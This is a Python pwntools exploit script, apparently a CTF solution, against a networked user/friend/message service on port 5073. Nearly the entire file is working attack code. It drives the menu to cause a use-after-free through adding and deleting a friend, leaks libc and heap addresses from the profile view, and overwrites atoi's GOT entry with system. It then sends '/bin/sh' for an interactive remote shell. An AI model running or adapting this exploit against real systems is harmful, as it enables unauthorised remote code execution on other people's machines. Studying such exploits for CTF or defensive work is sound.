#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1

#p = remote("172.16.5.60", 5073)
p = remote(sys.argv[1], 5073)

p.recvuntil("choice:")

def reg(size,name, age,desc):

    p.sendline("2")
    p.recvuntil("size:")
    p.sendline(str(size))
    p.recvuntil("name:")
    p.send(name)
    time.sleep(0.1)
    p.recvuntil("age:")
    p.sendline(str(age))
    p.recvuntil("description:")
    p.send(desc)
    time.sleep(0.1)
    p.recvuntil("choice:")

def login(name):

    p.sendline("1")
    p.recvuntil("name:")
    p.send(name)
    time.sleep(0.1)
    p.recvuntil("choice:")

def view_profile():

    p.sendline("1")
    data = p.recvuntil("choice:")
    return data

def update_profile(name, age, desc, shell=False):

    p.sendline("2")
    p.recvuntil("name:")
    p.send(name)
    time.sleep(0.1)
    p.recvuntil("age:")
    if shell == True:
        p.send("/bin/sh\x00")
        time.sleep(0.1)
        p.interactive()
    p.sendline(str(age))
    p.recvuntil("description:")
    p.send(desc)
    time.sleep(0.1)
    p.recvuntil("choice:")

def add_friend(name, a=True):

    p.sendline("3")
    p.recvuntil("name:")
    p.send(name)
    time.sleep(0.1)
    p.recvuntil("(a/d)")
    if a:
        p.sendline("a")
        p.recvuntil("choice:")
    else:
        p.sendline("d")
        p.recvuntil("choice:")

def send_msg(name,title,content):

    p.sendline("4")
    p.recvuntil("to:")
    p.send(name)
    time.sleep(0.1)
    p.recvuntil("title:")
    p.send(title)
    time.sleep(0.1)
    p.recvuntil("content:")
    p.send(content)
    time.sleep(0.1)
    p.recvuntil("choice:")

def view_msg():

    p.sendline("5")
    data = p.recvuntil("choice:")
    return data

def logout():

    p.sendline("6")
    p.recvuntil("choice:")

#reg serveral.


reg(0x68, "afang0" , 30, "a" * 0x100)

#login as first

login("afang0")

#make friends.

add_friend("afang0")
add_friend("afang0", a=False)
data = view_profile()
libc = data.split("Age:")[1][:12]
libc_base = int(libc,16) - 0x3c6760 - 0x58
top = data.split("Username:")[1].split("\n")[0]
top_chunk = u64(top.ljust(8,"\x00"))


system = libc_base + 0x431b0
atoi = libc_base + 0x377e0
print hex(libc_base)

target_got = 0x6020e0

logout()

reg(0x120, p64(0x602060), 50, "a" * 0x10)
login(p64(atoi))
update_profile(p64(system), 80, "aaaa", shell=True)




